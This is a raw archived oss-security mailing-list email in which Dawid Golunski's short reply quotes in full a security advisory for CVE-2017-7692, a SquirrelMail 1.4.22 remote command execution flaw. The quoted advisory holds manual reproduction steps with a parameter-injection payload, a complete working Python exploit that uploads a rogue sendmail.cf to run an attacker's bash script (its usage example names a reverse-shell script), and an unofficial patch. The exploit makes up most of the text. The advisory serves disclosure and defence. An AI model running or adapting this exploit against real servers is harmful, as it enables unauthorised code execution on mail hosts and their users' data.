X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["17024" "Monday" "24" "April" "2017" "21:36:23" "-0300" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzssa0h4hyeJVXrF6k0D_Pn7mviv+2XcOiH+N8iobr-aqbA@mail.gmail.com>" "499" "Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution" nil nil nil "4" "2017042500:36:23" "[oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution" (number mark "U       dawid@legalh Apr 24  499/17024 " thread-indent "\"Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution\"\n") "<38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>" ("<38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5692 invoked by uid 550); 25 Apr 2017 00:36:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5664 invoked from network); 25 Apr 2017 00:36:36 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=aKzyDgmwzcxRtmluonySy51WDfcrFqNZLVCJ6ByAkV8=;
        b=Nzj/tb7FscgGDkbgXzvv7em3xk5v/VL91DuLi88Ch2HEfjP31JSh9ZFxeBOyxjz8Wr
         2XIKproKtQB3oQhIsOj6aK0VHC44kg1QBPTWhUJIAr0GFKHv3NKzYMtzaZqhG9TiLVzH
         2JJWrntFPzHryDOpgKgKdSURn3E2O5CbBpR1SBwH6AKy5dISWxfzcr7igOjCwx+3hbVn
         zu9WMO/xeIs6o45oTyghG64iGA4MzF0GMdfqmHzQJGI89+IiU8iqzJfzBA9B202+ZU9G
         bAfhxJgILThGhelhj5zAMlAqR1F399+KMxVASAnT+nHZ9dxGFg9xvOPmCFjPnBQPXxru
         +lbQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:content-transfer-encoding;
        bh=aKzyDgmwzcxRtmluonySy51WDfcrFqNZLVCJ6ByAkV8=;
        b=WxPW6/2FZzej5TbNQPzwzvYENAH37OhMcOcurPyABnsOlFryop4bDkhCU+SKlbkZVP
         EXOQnzWXyvnaAv5JFhv9z/U6Y8Vo61zJmwpmgq59nicR5NuA4I0wmhV2kDJe8AEzJj+G
         ppmBpdkKezvrdnSOhalcXpHRaeJUVuWS8i4Uisvj3Yk5js1OEbDDq/oADoLRe1yobpqT
         eVh4kEumegXWVCSmHe/aw8JwfFH5AQNI1ayRc8KZLUifrOVH2nqw9IXCmChDDDdrU1nF
         Mm8RXpEZSkTUmkfd4+SnSbs5N22IPpL8SDEwhS49NGfUFCBvkcAP4GO7jlUYYR2WfLuK
         E50w==
X-Gm-Message-State: AN3rC/4tuyowukLxLkTFbGfLxjFsu2n3bUniXA0x5fPa3/XeRTYrPeeq
	7rFC80pZlpXfeX3tCgQbZ9n3WGmlVU92
X-Received: by 10.31.153.146 with SMTP id b140mr941106vke.73.1493080584224;
 Mon, 24 Apr 2017 17:36:24 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>
References: <38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>
From: Dawid Golunski <dawid@legalhackers.com>
Date: Mon, 24 Apr 2017 21:36:23 -0300
Message-ID: <CADSYzssa0h4hyeJVXrF6k0D_Pn7mviv+2XcOiH+N8iobr-aqbA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution

For anyone looking for continuation of this thread:

This thread was continued on full-disclosure, as well as a new thread
(related to SquirrelMail 1.4.23 which is also affected)
on oss-security list


Relevant links:

https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-C=
VE-2017-7692-Vuln.html

http://seclists.org/fulldisclosure/2017/Apr/89

http://www.openwall.com/lists/oss-security/2017/04/24/6


On Wed, Apr 19, 2017 at 10:14 AM, Filippo Cavallarin
<filippo.cavallarin@wearesegment.com> wrote:
> Advisory ID:           SGMA17-001
> Title:                 Squirrelmail Remote Code Execution
> Product:               Squirrelmail
> Version:               1.4.22 and probably prior
> Vendor:                squirrelmail.org
> Type:                  Command Injection
> Risk level:            4 / 5
> Credit:                filippo.cavallarin@wearesegment.com
> CVE:                   CVE-2017-7692
> Vendor notification:   2017-04-04
> Vendor fix:            N/A
> Public disclosure:     2017-04-19
>
>
>
>
> DETAILS
>
> Squirrelmail version 1.4.22 (and probably prior) is vulnerable to a remot=
e code execution vulnerability because
> it fails to sanitize a string before passing it to a popen call. It's pos=
sible to exploit this vulnerability to
> execute arbitrary shell commands on the remote server.
>
> The problem is in Deliver_SendMail.class.php on initStream function that =
uses escapeshellcmd() to sanitize the
> sendmail command before executing it. The use of escapeshellcmd() is not =
correct in this case since it don't
> escapes whitespaces allowing the injection of arbitrary command parameter=
s.
>
>       $this->sendmail_command =3D "$sendmail_path $this->sendmail_args -f=
$envelopefrom";
>       $stream =3D popen(escapeshellcmd($this->sendmail_command), "w");
>
>
> The $envelopefrom variable is controlled by the attacker, hence it's poss=
ible to trick sendmail to use an
> attacker-provided configuration file that triggers the execution of an ar=
bitrary command.
>
> In order to exploit this vulnerability the MTA in use must be sendmail an=
d Squirrelmail must be configured
> to use it as commandline (useSendmail directive of the config file set to=
 true).
> Also, the edit_identity directive of the config file must be bet to true,=
 but this is the default configuration.
>
> To reproduce the issue follow these steps:
>         1. Create a rogue sendmail.cf that triggers the execution of a /u=
sr/bin/touch:
>                 [...]
>                 Mlocal,         P=3D/usr/bin/touch, F=3DlsDFMAw5:/|@qPn9S=
, S=3DEnvFromL/HdrFromL, R=3DEnvToL/HdrToL,
>                 T=3DDNS/RFC822/X-Unix,
>                 A=3DX /tmp/executed
>         2. Upload it as a mail attachment and get it's remote name (ex: l=
F51mGPJwdqzV3LEDlCdSVNpohzgF7sD)
>         3. Go to Options -> Personal Informations and set the following p=
ayload as Email Address:
>                 <aaa@abc.com -OQueueDirectory=3D/tmp  -C /var/local/squir=
relmail/attach/lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD>
>         4. Send an email
>         5. Verify the execution of the command with "ls /tmp/executed" on=
 the remote server
>
>
>
>
> PROOF OF CONCEPT
>
> The followig python script exploits this vulnerability to execute an atta=
cker provided bash script on the remote server.
>
> BOF
> #!/usr/bin/env python
> # -*- coding: utf-8 -*-
>
> """
>
> SquirrelMail 1.4.22 Remote Code Execution (authenticated)
> Exploit code for CVE-2017-7692
> filippo.cavallarin@wearesegment.com
>
> """
>
> from __future__ import unicode_literals
> import sys
> import os
> import re
> import requests
>
> reload(sys)
> sys.setdefaultencoding('utf8')
>
>
> SENDMAILCF=3D"/tmp/squirrelmail1_4_22-sendmailcf-rce"
> COMPOSE =3D "/src/compose.php"
> INFOS =3D "/src/options.php?optpage=3Dpersonal"
> SQM_ATTACH_PATH =3D "/var/local/squirrelmail/attach/"
> # must be enclosed in <> otherwise spaces will be removed ..
> SENDER =3D "<px@xxxx.com -OQueueDirectory=3D/tmp  -C %s%s>"
>
>
> SESSID =3D ""
> BASEURL =3D ""
>
>
> def attach(attachment):
>   url =3D "%s%s" % (BASEURL, COMPOSE)
>   token =3D get_csrf_token(url)
>
>   values =3D {
>     "smtoken": token,
>     "attach": "add"
>   }
>
>   try:
>     files =3D {'attachfile': open(attachment,'rb')}
>     resp =3D requests.post(url, files=3Dfiles, data=3Dvalues, cookies=3D{=
'SQMSESSID':SESSID})
>     fname =3D re.search(r'att_local_name&quot;;s:[0-9]+:&quot;([a-zA-Z0-9=
]+)&quot;', resp.text)
>     if not fname:
>       print "\nError: unable to upload file %s" % attachment
>     return fname.group(1)
>
>   except Exception as e:
>     print "\nError: %s" % e
>     sys.exit(1)
>
>
> def send():
>   url =3D "%s%s" % (BASEURL, COMPOSE)
>   token =3D get_csrf_token(url)
>
>   values =3D {
>     "smtoken": token,
>     "send_to": "root",
>     "send": "Send"
>   }
>
>   try:
>     resp =3D requests.post(url, data=3Dvalues, cookies=3D{'SQMSESSID':SES=
SID})
>   except Exception as e:
>     print "\nError: %s" % e
>     sys.exit(1)
>
>
> def set_identity(sender):
>   url =3D "%s%s" % (BASEURL, INFOS)
>   token =3D get_csrf_token(url)
>   values =3D {
>     "smtoken": token,
>     "optpage": "personal",
>     "optmode": "submit",
>     "new_email_address": sender,
>     "submit_personal": "Submit"
>   }
>
>   try:
>     requests.post(url, data=3Dvalues, cookies=3D{'SQMSESSID':SESSID})
>   except Exception as e:
>     print "\nError: %s" % e
>     sys.exit(1)
>
>
> def get_csrf_token(url):
>   try:
>     body =3D requests.get(url, cookies=3D{'SQMSESSID':SESSID}).text
>     inp =3D re.search(r'<input.*name=3D"smtoken".*>', body, re.MULTILINE)
>     token =3D re.search(r'value=3D"([a-zA-Z0-9]+)"', inp.group(0))
>     if token:
>       return token.group(1)
>   except Exception as e:
>     pass
>
>   print "\nUnable to get CSRF token"
>   sys.exit(1)
>
> def outw(s):
>   sys.stdout.write(s)
>   sys.stdout.flush()
>
> def main(argv):
>   global BASEURL
>   global SESSID
>
>   if len(argv) !=3D 4:
>     print (
>         "SquirrelMail 1.4.22 Remote Code Execution (authenticated) - fili=
ppo.cavallarin@wearesegment.com\n"
>         "The target server must use sendmail and squirrelmail must be con=
figured to use /usr/bin/sendmail\n"
>         "Usage:\n"
>         "  %s <url> <session_id> <script>\n"
>         "      url: the url of squirrelmail\n"
>         "      session_id: the value of SQMSESSID cookie\n"
>         "      script: the path to the bash script to be executed on the =
target\n"
>         "Example:\n"
>         "  %s http:/example.com/squirrelmail/ l2rapvcovsui1on0b4i5boev24 =
reverseshell.sh"
>       ) % (argv[0], argv[0])
>
>     sys.exit(1)
>
>   BASEURL =3D argv[1]
>   SESSID =3D argv[2]
>   script =3D argv[3]
>
>   outw("Uploading script ... ")
>   script_fname =3D attach(script)
>   print "ok"
>
>
>   outw("Generating sendmail.cf ... ")
>   try:
>     script_path =3D "%s%s" % (SQM_ATTACH_PATH, script_fname)
>     with open(SENDMAILCF, 'w') as f:
>       f.write(SENDMAILCF_CONTENT % script_path)
>   except Exception as e:
>     print "\nError: %s" % e
>     sys.exit(1)
>   print "ok"
>
>   outw("Uploading sendmail.cf ... ")
>   smc_fname =3D attach(SENDMAILCF)
>   os.remove(SENDMAILCF)
>   print "ok"
>
>   outw("Updating user options ... ")
>   sender =3D SENDER % (SQM_ATTACH_PATH, smc_fname)
>   set_identity(sender)
>   print "ok"
>
>   outw("Checking identity field ... ")
>   icheck =3D requests.get("%s%s" % (BASEURL, INFOS), cookies=3D{'SQMSESSI=
D':SESSID}).text
>   if not smc_fname in icheck:
>     print "\nError: unable to set identity field .. maybe squirrelmail is=
 configured with edit_identity=3Dfalse"
>     sys.exit(1)
>   print "ok"
>
>   outw("Executing script ... ")
>   send()
>   print "ok\n"
>   sys.exit(0)
>
> SENDMAILCF_CONTENT =3D """
> O DontBlameSendmail=3D,AssumeSafeChown,ForwardFileInGroupWritableDirPath,=
GroupWritableForwardFileSafe,GroupWritableIncludeFileSafe,IncludeFileInGrou=
pWritableDirPath,DontWarnForwardFileInUnsafeDirPath,TrustStickyBit,NonRootS=
afeAddr,GroupWritableIncludeFile,GroupReadableDefaultAuthInfoFile
> Kdequote dequote
> Scanonify=3D3
> R$@     $@ <@>
> R$*     $: $1 <@>     mark addresses
> R$* < $* > $* <@> $: $1 < $2 > $3     unmark <addr>
> R@ $* <@>   $: @ $1       unmark @host:...
> R$* [ IPv6 : $+ ] <@> $: $1 [ IPv6 : $2 ]   unmark IPv6 addr
> R$* :: $* <@>   $: $1 :: $2     unmark node::addr
> R:include: $* <@> $: :include: $1     unmark :include:...
> R$* : $* [ $* ]   $: $1 : $2 [ $3 ] <@>   remark if leading colon
> R$* : $* <@>    $: $2       strip colon if marked
> R$* <@>     $: $1       unmark
> R$* ;        $1       strip trailing semi
> R$* < $+ :; > $*  $@ $2 :; <@>      catch <list:;>
> R$* < $* ; >       $1 < $2 >      bogus bracketed semi
> R$@     $@ :; <@>
> R$*     $: < $1 >     housekeeping <>
> R$+ < $* >       < $2 >     strip excess on left
> R< $* > $+       < $1 >     strip excess on right
> R<>     $@ < @ >      MAIL FROM:<> case
> R< $+ >     $: $1       remove housekeeping <>
> R@ $+ , $+    $2
> R@ [ $* ] : $+    $2
> R@ $+ : $+    $2
> R $+ : $* ; @ $+  $@ $>Canonify2 $1 : $2 ; < @ $3 > list syntax
> R $+ : $* ;   $@ $1 : $2;     list syntax
> R$+ @ $+    $: $1 < @ $2 >      focus on domain
> R$+ < $+ @ $+ >   $1 $2 < @ $3 >      move gaze right
> R$+ < @ $+ >    $@ $>Canonify2 $1 < @ $2 >  already canonical
> R$- ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  resolve uucp names
> R$+ . $- ! $+   $@ $>Canonify2 $3 < @ $1 . $2 >   domain uucps
> R$+ ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  uucp subdomains
> R$* %% $*   $1 @ $2       First make them all @s.
> R$* @ $* @ $*   $1 %% $2 @ $3     Undo all but the last.
> R$* @ $*    $@ $>Canonify2 $1 < @ $2 >  Insert < > and finish
> R$*     $@ $>Canonify2 $1
> SCanonify2=3D96
> R$* < @ localhost > $*    $: $1 < @ $j . > $2   no domain at all
> R$* < @ localhost . $m > $* $: $1 < @ $j . > $2   local domain
> R$* < @ localhost . UUCP > $* $: $1 < @ $j . > $2   .UUCP domain
> R$* < @ [ $+ ] > $*   $: $1 < @@ [ $2 ] > $3    mark [addr]
> R$* < @@ $=3Dw > $*   $: $1 < @ $j . > $3   self-literal
> R$* < @@ $+ > $*    $@ $1 < @ $2 > $3   canon IP addr
> Sfinal=3D4
> R$+ :; <@>    $@ $1 :       handle <list:;>
> R$* <@>     $@        handle <> and list:;
> R$* < @ $+ . > $* $1 < @ $2 > $3
> R$* < @ *LOCAL* > $*  $1 < @ $j > $2
> R$* < $+ > $*   $1 $2 $3      defocus
> R@ $+ : @ $+ : $+ @ $1 , @ $2 : $3    <route-addr> canonical
> R@ $*     $@ @ $1       ... and exit
> R$+ @ $- . UUCP   $2!$1       u@h.UUCP =3D> h!u
> R$+ %% $=3Dw @ $=3Dw    $1 @ $2       u%%host@host =3D> u@host
> SRecurse=3D97
> R$*     $: $>canonify $1
> R$*     $@ $>parse $1
> Sparse=3D0
> R$*     $: $>Parse0 $1    initial parsing
> R<@>      $#local $: <@>    special case error msgs
> R$*     $: $>ParseLocal $1  handle local hacks
> R$*     $: $>Parse1 $1    final parsing
> SParse0
> R<@>      $@ <@>      special case error msgs
> R$* : $* ; <@>    $#error $@ 5.1.3 $: "553 List:; syntax illegal for reci=
pient addresses"
> R@ <@ $* >    < @ $1 >    catch "@@host" bogosity
> R<@ $+>     $#error $@ 5.1.3 $: "553 User address required"
> R$+ <@>     $#error $@ 5.1.3 $: "553 Hostname required"
> R$*     $: <> $1
> R<> $* < @ [ $* ] : $+ > $* $1 < @ [ $2 ] : $3 > $4
> R<> $* < @ [ $* ] , $+ > $* $1 < @ [ $2 ] , $3 > $4
> R<> $* < @ [ $* ] $+ > $* $#error $@ 5.1.2 $: "553 Invalid address"
> R<> $* < @ [ $+ ] > $*    $1 < @ [ $2 ] > $3
> R<> $* <$* : $* > $*  $#error $@ 5.1.3 $: "553 Colon illegal in host name=
 part"
> R<> $*      $1
> R$* < @ . $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
> R$* < @ $* .. $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
> R$* < @ $* @ > $* $#error $@ 5.1.2 $: "553 Invalid route address"
> R$* @ $* < @ $* > $*  $#error $@ 5.1.3 $: "553 Invalid route address"
> R$* , $~O $*    $#error $@ 5.1.3 $: "553 Invalid route address"
> R$* < @ > $*    $@ $>Parse0 $>canonify $1 user@ =3D> user
> R< @ $=3Dw . > : $* $@ $>Parse0 $>canonify $2 @here:... -> ...
> R$- < @ $=3Dw . >   $: $(dequote $1 $) < @ $2 . > dequote "foo"@here
> R< @ $+ >   $#error $@ 5.1.3 $: "553 User address required"
> R$* $=3DO $* < @ $=3Dw . >  $@ $>Parse0 $>canonify $1 $2 $3 ...@here -> .=
..
> R$-       $: $(dequote $1 $) < @ *LOCAL* >  dequote "foo"
> R< @ *LOCAL* >    $#error $@ 5.1.3 $: "553 User address required"
> R$* $=3DO $* < @ *LOCAL* >
>       $@ $>Parse0 $>canonify $1 $2 $3 ...@*LOCAL* -> ...
> R$* < @ *LOCAL* > $: $1
> SParse1
> R$* < @ [ $+ ] > $* $: $>ParseLocal $1 < @ [ $2 ] > $3  numeric internet =
spec
> R$* < @ [ $+ ] > $* $: $1 < @ [ $2 ] : $S > $3  Add smart host to path
> R$* < @ [ $+ ] : > $*   $#esmtp $@ [$2] $: $1 < @ [$2] > $3 no smarthost:=
 send
> R$* < @ [ $+ ] : $- : $*> $*  $#$3 $@ $4 $: $1 < @ [$2] > $5  smarthost w=
ith mailer
> R$* < @ [ $+ ] : $+ > $*  $#esmtp $@ $3 $: $1 < @ [$2] > $4 smarthost wit=
hout mailer
> R$=3DL < @ $=3Dw . >  $#local $: @ $1     special local names
> R$+ < @ $=3Dw . >   $#local $: $1     regular local name
> R$* < @ $* > $*   $: $>MailerToTriple < $S > $1 < @ $2 > $3 glue on smart=
host name
> R$* < @$* > $*    $#esmtp $@ $2 $: $1 < @ $2 > $3 user@host.domain
> R$=3DL      $#local $: @ $1   special local names
> R$+     $#local $: $1     regular local names
> SLocal_localaddr
> Slocaladdr=3D5
> R$+     $: $1 $| $>"Local_localaddr" $1
> R$+ $| $#ok   $@ $1     no change
> R$+ $| $#$*   $#$2
> R$+ $| $*   $: $1
> R$+ + *     $#local $@ $&h $: $1
> R$+ + $*    $#local $@ + $2 $: $1 + *
> R$+     $: <> $1
> R< > $+     $: < > < $1 <> $&h >    nope, restore +detail
> R< > < $+ <> + $* > $: < > < $1 + $2 >    check whether +detail
> R< > < $+ <> $* > $: < > < $1 >     else discard
> R< > < $+ + $* > $*    < > < $1 > + $2 $3   find the user part
> R< > < $+ > + $*  $#local $@ $2 $: @ $1   strip the extra +
> R< > < $+ >   $@ $1       no +detail
> R$+     $: $1 <> $&h      add +detail back in
> R$+ <> + $*   $: $1 + $2      check whether +detail
> R$+ <> $*   $: $1       else discard
> R< local : $* > $*  $: $>MailerToTriple < local : $1 > $2 no host extensi=
on
> R< error : $* > $*  $: $>MailerToTriple < error : $1 > $2 no host extensi=
on
> R< $~[ : $+ > $+  $: $>MailerToTriple < $1 : $2 > $3 < @ $2 >
> R< $+ > $+    $@ $>MailerToTriple < $1 > $2 < @ $1 >
> SParseLocal=3D98
> SEnvFromL
> R<@>      $n      errors to mailer-daemon
> R@ <@ $*>   $n      temporarily bypass Sun bogosity
> R$+     $: $>AddDomain $1 add local domain if needed
> R$*     $: $>MasqEnv $1   do masquerading
> SEnvToL
> R$+ < @ $* >    $: $1     strip host part
> R$+ + $*    $: < $&{addr_type} > $1 + $2  mark with addr type
> R<e s> $+ + $*    $: $1     remove +detail for sender
> R< $* > $+    $: $2     else remove mark
> SHdrFromL
> R<@>      $n      errors to mailer-daemon
> R@ <@ $*>   $n      temporarily bypass Sun bogosity
> R$+     $: $>AddDomain $1 add local domain if needed
> R$*     $: $>MasqHdr $1   do masquerading
> SHdrToL
> R$+     $: $>AddDomain $1 add local domain if needed
> R$*     $: $>MasqHdr $1   do all-masquerading
> SAddDomain
> R$* < @ $* > $*   $@ $1 < @ $2 > $3 already fully qualified
> R$+     $@ $1 < @ *LOCAL* > add local qualification
> Mlocal,   P=3D/bin/bash, F=3DlsDFMAw5:/|@qPn9S, S=3DEnvFromL/HdrFromL, R=
=3DEnvToL/HdrToL,
>     T=3DDNS/RFC822/X-Unix,
>     A=3DX %s
> Mprog,    P=3D/bin/sh, F=3DlsDFMoqeu9, S=3DEnvFromL/HdrFromL, R=3DEnvToL/=
HdrToL, D=3D$z:/,
>     T=3DX-Unix/X-Unix/X-Unix,
>     A=3Dsh -c $u
>
> """
>
> if __name__ =3D=3D '__main__':
>   main(sys.argv)
>
> EOF
>
>
>
>
> SOLUTION
>
> Since the vendor did not respond to our mails, no official fix is availab=
le.
> However, the following unofficial patch can be used to fix this vulnerabi=
lity.
>
> BOF
> diff -ruN squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.clas=
s.php squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_S=
endMail.class.php
> --- squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php =
 2011-01-06 02:44:03.000000000 +0000
> +++ squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_S=
endMail.class.php  2017-04-18 11:42:26.505181944 +0000
> @@ -93,9 +93,9 @@
>          $envelopefrom =3D trim($from->mailbox.'@'.$from->host);
>          $envelopefrom =3D str_replace(array("\0","\n"),array('',''),$env=
elopefrom);
>          // save executed command for future reference
> -        $this->sendmail_command =3D "$sendmail_path $this->sendmail_args=
 -f$envelopefrom";
> +        $this->sendmail_command =3D escapeshellcmd("$sendmail_path $this=
->sendmail_args -f") . escapeshellarg($envelopefrom);
>          // open process handle for writing
> -        $stream =3D popen(escapeshellcmd($this->sendmail_command), "w");
> +        $stream =3D popen($this->sendmail_command, "w");
>          return $stream;
>      }
> EOF
>
>
>
>
> REFERENCES
>
> https://squirrelmail.org/
> https://www.wearesegment.com/research/Squirrelmail-Remote-Code-Execution.=
html
>
>
>



--=20
Regards,
Dawid Golunski
https://legalhackers.com
t: @dawid_golunski
